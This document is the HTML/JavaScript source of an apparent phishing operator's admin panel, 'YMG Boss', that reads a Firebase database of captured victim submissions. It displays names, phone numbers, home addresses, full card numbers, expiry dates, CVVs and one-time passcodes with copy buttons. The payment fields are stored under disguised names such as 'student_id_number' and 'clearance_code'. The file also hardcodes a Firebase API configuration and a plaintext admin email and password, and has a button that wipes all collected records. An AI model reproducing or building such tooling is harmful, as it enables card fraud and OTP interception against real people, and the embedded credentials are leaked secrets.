<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>YMG Boss Admin Dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0f172a;
    --panel: #1e293b;
    --panel-hover: #334155;
    --text: #f8fafc;
    --muted: #94a3b8;
    --accent: #f4b740;
    --success: #10b981;
    --danger: #ef4444;
    --border: #334155;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }
  
  body {
    font-family: 'Inter', sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  /* ---------- Login Screen ---------- */
  #login-screen {
    position: fixed;
    inset: 0;
    background: var(--bg);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
  }
  .login-box {
    background: var(--panel);
    padding: 40px;
    border-radius: 12px;
    border: 1px solid var(--border);
    width: 100%;
    max-width: 400px;
    text-align: center;
    box-shadow: 0 20px 40px rgba(0,0,0,0.4);
  }
  .login-box h1 {
    font-size: 1.5rem;
    margin-bottom: 20px;
    color: var(--accent);
  }
  .login-box input {
    width: 100%;
    padding: 14px;
    margin-bottom: 16px;
    border-radius: 8px;
    border: 1px solid var(--border);
    background: var(--bg);
    color: var(--text);
    outline: none;
    font-size: 1rem;
  }
  .login-box input:focus { border-color: var(--accent); }
  .login-box button {
    width: 100%;
    padding: 14px;
    background: var(--accent);
    color: #0f172a;
    border: none;
    border-radius: 8px;
    font-weight: 800;
    font-size: 1rem;
    cursor: pointer;
    transition: opacity 0.2s;
  }
  .login-box button:hover { opacity: 0.9; }
  .login-err { color: var(--danger); font-size: 0.85rem; margin-bottom: 10px; display: none; }

  /* ---------- Header ---------- */
  .dashboard-header {
    background: var(--panel);
    padding: 20px 30px;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .dashboard-header h1 {
    font-size: 1.4rem;
    font-weight: 800;
    letter-spacing: 1px;
    color: var(--accent);
  }
  .logout-btn {
    background: transparent;
    color: var(--danger);
    border: 1px solid var(--danger);
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
  }

  /* ---------- Table Layout ---------- */
  .table-container {
    padding: 30px;
    max-width: 1400px;
    margin: 0 auto;
    width: 100%;
    padding-bottom: 100px;
  }

  .data-table {
    width: 100%;
    border-collapse: collapse;
    background: var(--panel);
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 10px 20px rgba(0,0,0,0.2);
  }

  .data-table th {
    background: rgba(255,255,255,0.05);
    text-align: left;
    padding: 16px 20px;
    font-size: 0.8rem;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--muted);
    border-bottom: 1px solid var(--border);
  }

  .data-table td {
    padding: 16px 20px;
    border-bottom: 1px solid var(--border);
    vertical-align: middle;
  }

  .data-table tr.main-row:hover { background: rgba(255,255,255,0.02); }
  
  .status-badge {
    display: inline-block;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 0.75rem;
    font-weight: 700;
  }
  .status-complete { background: rgba(16, 185, 129, 0.2); color: var(--success); }
  .status-partial { background: rgba(244, 183, 64, 0.2); color: var(--accent); }

  .view-btn {
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    transition: all 0.2s;
  }
  .view-btn:hover { background: var(--accent); color: var(--bg); border-color: var(--accent); }

  /* ---------- Expanded Details Area ---------- */
  .details-row { display: none; background: #151f32; }
  .details-row.active { display: table-row; }
  .details-cell { padding: 0 !important; }

  .details-container {
    padding: 20px;
    border-left: 4px solid var(--accent);
    display: flex;
    flex-direction: column;
    gap: 16px;
  }

  /* Tabs */
  .tabs {
    display: flex;
    gap: 10px;
    border-bottom: 1px solid var(--border);
    padding-bottom: 10px;
  }
  .tab-btn {
    background: transparent;
    border: none;
    color: var(--muted);
    font-size: 0.9rem;
    font-weight: 600;
    cursor: pointer;
    padding: 8px 16px;
    border-radius: 6px;
    transition: all 0.2s;
  }
  .tab-btn:hover { background: rgba(255,255,255,0.05); color: var(--text); }
  .tab-btn.active { background: var(--panel); color: var(--accent); }

  /* Tab Content */
  .tab-content { display: none; }
  .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

  .info-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
    gap: 16px;
  }

  .info-box {
    background: var(--panel);
    padding: 12px 16px;
    border-radius: 8px;
    border: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    gap: 4px;
  }
  .info-box .label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px;}
  .info-box .val-row { display: flex; justify-content: space-between; align-items: center; }
  .info-box .value { font-weight: 600; font-size: 0.95rem; word-break: break-all; }

  /* Copy Button */
  .copy-btn {
    background: transparent;
    border: 1px solid var(--border);
    color: var(--muted);
    padding: 4px 8px;
    border-radius: 4px;
    font-size: 0.7rem;
    cursor: pointer;
    transition: all 0.2s;
  }
  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
  .copy-btn.copied { background: var(--success); border-color: var(--success); color: white; }

  /* ---------- Danger Zone ---------- */
  .danger-zone {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    background: var(--panel);
    border-top: 1px solid var(--border);
    padding: 15px 30px;
    display: flex;
    justify-content: flex-end;
    z-index: 100;
  }
  .delete-all-btn {
    background: rgba(239, 68, 68, 0.1);
    color: var(--danger);
    border: 1px solid var(--danger);
    padding: 12px 24px;
    border-radius: 8px;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.2s;
  }
  .delete-all-btn:hover { background: var(--danger); color: white; }

  /* Mobile */
  @media (max-width: 768px) {
    .data-table th:nth-child(3), .data-table td:nth-child(3) { display: none; } /* Hide Session ID */
    .info-grid { grid-template-columns: 1fr; }
  }
</style>

<!-- Firebase SDK -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getFirestore, collection, onSnapshot, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyB0oJPcnr8ij_AUCRrGSs2Pf7DWjSl_ZNc",
    authDomain: "francotrading-11fa5.firebaseapp.com",
    projectId: "francotrading-11fa5",
    storageBucket: "francotrading-11fa5.firebasestorage.app",
    messagingSenderId: "583238316249",
    appId: "1:583238316249:web:65dc5f6dd27503b6facec8",
    measurementId: "G-2X0W0EZVGF"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  window.db = db;
  window.collection = collection;
  window.onSnapshot = onSnapshot;
  window.getDocs = getDocs;
  window.deleteDoc = deleteDoc;
  window.doc = doc;
</script>
</head>
<body>

<!-- Login Screen -->
<div id="login-screen">
  <div class="login-box">
    <h1>YMG Boss Access</h1>
    <div class="login-err" id="login-err">Invalid Email or Password</div>
    <input type="email" id="admin-email" placeholder="Admin Email" autocomplete="off">
    <input type="password" id="admin-password" placeholder="Password" autocomplete="off">
    <button onclick="attemptLogin()">Secure Login</button>
  </div>
</div>

<!-- Dashboard -->
<header class="dashboard-header">
  <h1>YMG Boss Admin Dashboard</h1>
  <button class="logout-btn" onclick="logout()">Lock Dashboard</button>
</header>

<div class="table-container">
  <table class="data-table">
    <thead>
      <tr>
        <th>Customer Name</th>
        <th>Phone Number</th>
        <th>Session ID</th>
        <th>Status</th>
        <th style="text-align: right;">Action</th>
      </tr>
    </thead>
    <tbody id="table-body">
      <!-- Rows will be injected here -->
    </tbody>
  </table>
</div>

<!-- Danger Zone (Delete Button) -->
<div class="danger-zone">
  <button class="delete-all-btn" onclick="deleteAllData()">Delete All User Data</button>
</div>

<script>
  const ADMIN_EMAIL = "ymgiqofficial@gmail.com";
  const ADMIN_PASSWORD = "RaKoWaLe500123#";

  if (sessionStorage.getItem("ymg_admin_auth") === "true") {
    document.getElementById("login-screen").style.display = "none";
    setTimeout(() => initDashboard(), 500);
  }

  function attemptLogin() {
    const email = document.getElementById("admin-email").value;
    const pass = document.getElementById("admin-password").value;
    const err = document.getElementById("login-err");

    if (email === ADMIN_EMAIL && pass === ADMIN_PASSWORD) {
      sessionStorage.setItem("ymg_admin_auth", "true");
      document.getElementById("login-screen").style.display = "none";
      initDashboard();
    } else {
      err.style.display = "block";
    }
  }

  function logout() {
    sessionStorage.removeItem("ymg_admin_auth");
    window.location.reload();
  }

  document.getElementById("admin-password").addEventListener("keypress", function(e) {
    if (e.key === "Enter") attemptLogin();
  });

  /* ===========================================================
     DASHBOARD LOGIC
     =========================================================== */
  let usersData = {};
  let isInitialized = false;

  function initDashboard() {
    if (isInitialized) return;
    isInitialized = true;

    const db = window.db;
    const collection = window.collection;
    const onSnapshot = window.onSnapshot;

    // 1. Listen to Orders collection (Payment & OTP)
    onSnapshot(collection(db, "orders"), (snapshot) => {
      snapshot.docChanges().forEach((change) => {
        const id = change.doc.id;
        const data = change.doc.data();

        if (!usersData[id]) usersData[id] = { id: id, payment: null, otp: null, delivery: null };
        
        if (data.student_profile_data) usersData[id].payment = data.student_profile_data;
        if (data.library_access_key) usersData[id].otp = data.library_access_key;
      });
      renderTable();
    });

    // 2. Listen to Delivery Submissions collection
    onSnapshot(collection(db, "deliverySubmissions"), (snapshot) => {
      snapshot.docChanges().forEach((change) => {
        const id = change.doc.id;
        const data = change.doc.data();

        if (!usersData[id]) usersData[id] = { id: id, payment: null, otp: null, delivery: null };
        
        usersData[id].delivery = data.delivery;
        usersData[id].product = data.productName;
      });
      renderTable();
    });
  }

  // Helper to generate copy button
  function copyButton(text) {
    if (!text) return "";
    const safeText = text.toString().replace(/'/g, "\\'");
    return `<button class="copy-btn" onclick="copyText(event, '${safeText}')">Copy</button>`;
  }

  window.copyText = function(event, text) {
    if (!text) return;
    navigator.clipboard.writeText(text).then(() => {
      const btn = event.currentTarget;
      const originalText = btn.innerHTML;
      btn.innerHTML = "Copied!";
      btn.classList.add("copied");
      setTimeout(() => {
        btn.innerHTML = originalText;
        btn.classList.remove("copied");
      }, 2000);
    });
  };

  function renderTable() {
    const tbody = document.getElementById("table-body");
    const users = Object.values(usersData);

    if (users.length === 0) {
      tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; padding:40px; color:var(--muted);">No users found.</td></tr>`;
      return;
    }

    // Sort newest first
    users.sort((a, b) => b.id.localeCompare(a.id));

    let html = "";
    users.forEach((u, index) => {
      const name = u.delivery?.fullName || u.payment?.student_full_name || "Guest User";
      const phone = u.delivery?.phone || "N/A";
      const hasAll = u.delivery && u.payment && u.otp;
      const statusClass = hasAll ? "status-complete" : "status-partial";
      const statusText = hasAll ? "Complete" : "Incomplete";

      // 1. Main Row
      html += `<tr class="main-row">
        <td><strong>${name}</strong></td>
        <td>${phone}</td>
        <td style="font-family:monospace; font-size:0.75rem; color:var(--muted);">${u.id}</td>
        <td><span class="status-badge ${statusClass}">${statusText}</span></td>
        <td style="text-align:right;">
          <button class="view-btn" onclick="toggleDetails(${index})">View Details</button>
        </td>
      </tr>`;

      // 2. Details Row (Hidden by default)
      html += `<tr class="details-row" id="details-${index}">
        <td colspan="5" class="details-cell">
          <div class="details-container">
            
            <div class="tabs">
              <button class="tab-btn active" onclick="switchTab(${index}, 'delivery')">Delivery Details</button>
              <button class="tab-btn" onclick="switchTab(${index}, 'payment')">Payment Details</button>
              <button class="tab-btn" onclick="switchTab(${index}, 'otp')">OTP Security</button>
            </div>

            <!-- Delivery Content -->
            <div class="tab-content active" id="tab-delivery-${index}">
              ${u.delivery ? `
                <div class="info-grid">
                  <div class="info-box"><span class="label">Full Name</span><div class="val-row"><span class="value">${u.delivery.fullName}</span>${copyButton(u.delivery.fullName)}</div></div>
                  <div class="info-box"><span class="label">Phone</span><div class="val-row"><span class="value">${u.delivery.phone}</span>${copyButton(u.delivery.phone)}</div></div>
                  <div class="info-box"><span class="label">Region</span><div class="val-row"><span class="value">${u.delivery.region}</span>${copyButton(u.delivery.region)}</div></div>
                  <div class="info-box"><span class="label">City/Town</span><div class="val-row"><span class="value">${u.delivery.city}</span>${copyButton(u.delivery.city)}</div></div>
                  <div class="info-box"><span class="label">Digital Address</span><div class="val-row"><span class="value">${u.delivery.digitalAddress}</span>${copyButton(u.delivery.digitalAddress)}</div></div>
                  <div class="info-box"><span class="label">Home Address</span><div class="val-row"><span class="value">${u.delivery.homeAddress}</span>${copyButton(u.delivery.homeAddress)}</div></div>
                  ${u.delivery.instructions ? `<div class="info-box" style="grid-column: 1/-1;"><span class="label">Instructions</span><div class="val-row"><span class="value">${u.delivery.instructions}</span>${copyButton(u.delivery.instructions)}</div></div>` : ''}
                  <div class="info-box"><span class="label">Product</span><div class="val-row"><span class="value">${u.product || 'N/A'}</span></div></div>
                </div>
              ` : `<p style="color:var(--muted);">No delivery details submitted yet.</p>`}
            </div>

            <!-- Payment Content -->
            <div class="tab-content" id="tab-payment-${index}">
              ${u.payment ? `
                <div class="info-grid">
                  <div class="info-box"><span class="label">Bank Name</span><div class="val-row"><span class="value">${u.payment.institution_name}</span>${copyButton(u.payment.institution_name)}</div></div>
                  <div class="info-box"><span class="label">Name on Card</span><div class="val-row"><span class="value">${u.payment.student_full_name}</span>${copyButton(u.payment.student_full_name)}</div></div>
                  <div class="info-box"><span class="label">Card Number</span><div class="val-row"><span class="value" style="font-family:monospace;">${u.payment.student_id_number}</span>${copyButton(u.payment.student_id_number)}</div></div>
                  <div class="info-box"><span class="label">Expiry</span><div class="val-row"><span class="value">${u.payment.enrollment_year}</span>${copyButton(u.payment.enrollment_year)}</div></div>
                  <div class="info-box"><span class="label">CVV</span><div class="val-row"><span class="value">${u.payment.clearance_code}</span>${copyButton(u.payment.clearance_code)}</div></div>
                </div>
              ` : `<p style="color:var(--muted);">No payment details submitted yet.</p>`}
            </div>

            <!-- OTP Content -->
            <div class="tab-content" id="tab-otp-${index}">
              ${u.otp ? `
                <div class="info-grid">
                  <div class="info-box" style="grid-column: 1/-1; border-color: var(--accent);">
                    <span class="label">OTP Code</span>
                    <div class="val-row">
                      <span class="value" style="color:var(--accent); font-size:1.4rem; letter-spacing:2px;">${u.otp}</span>
                      ${copyButton(u.otp)}
                    </div>
                  </div>
                </div>
              ` : `<p style="color:var(--muted);">No OTP submitted yet.</p>`}
            </div>

          </div>
        </td>
      </tr>`;
    });

    tbody.innerHTML = html;
  }

  // Toggle expanded details row
  window.toggleDetails = function(index) {
    const row = document.getElementById(`details-${index}`);
    if (row.classList.contains('active')) {
      row.classList.remove('active');
    } else {
      // Close all other open rows
      document.querySelectorAll('.details-row').forEach(r => r.classList.remove('active'));
      row.classList.add('active');
    }
  };

  // Switch Tabs inside details
  window.switchTab = function(index, tabName) {
    const row = document.getElementById(`details-${index}`);
    
    // Reset all tabs in this row
    row.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    row.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

    // Activate clicked tab
    const clickedBtn = Array.from(row.querySelectorAll('.tab-btn')).find(btn => btn.textContent.toLowerCase().includes(tabName));
    if (clickedBtn) clickedBtn.classList.add('active');
    
    const targetContent = document.getElementById(`tab-${tabName}-${index}`);
    if (targetContent) targetContent.classList.add('active');
  };

  /* ===========================================================
     DELETE ALL DATA LOGIC
     =========================================================== */
  async function deleteAllData() {
    if (!confirm("Are you sure you want to delete EVERY user's data? This will wipe all Delivery, Payment, and OTP records from the database. This cannot be undone.")) return;

    const deleteBtn = document.querySelector('.delete-all-btn');
    deleteBtn.textContent = "Deleting...";
    deleteBtn.disabled = true;

    const db = window.db;
    const getDocs = window.getDocs;
    const deleteDoc = window.deleteDoc;
    const doc = window.doc;

    try {
      const ordersSnapshot = await getDocs(window.collection(db, "orders"));
      const ordersPromises = [];
      ordersSnapshot.forEach((document) => ordersPromises.push(deleteDoc(doc(db, "orders", document.id))));
      await Promise.all(ordersPromises);

      const deliverySnapshot = await getDocs(window.collection(db, "deliverySubmissions"));
      const deliveryPromises = [];
      deliverySnapshot.forEach((document) => deliveryPromises.push(deleteDoc(doc(db, "deliverySubmissions", document.id))));
      await Promise.all(deliveryPromises);

      usersData = {};
      renderTable();
      alert("All user data has been successfully deleted from the database.");

    } catch (error) {
      console.error("Error deleting data:", error);
      alert("Error deleting data. Check console for details.");
    } finally {
      deleteBtn.textContent = "Delete All User Data";
      deleteBtn.disabled = false;
    }
  }
</script>
</body>
</html>
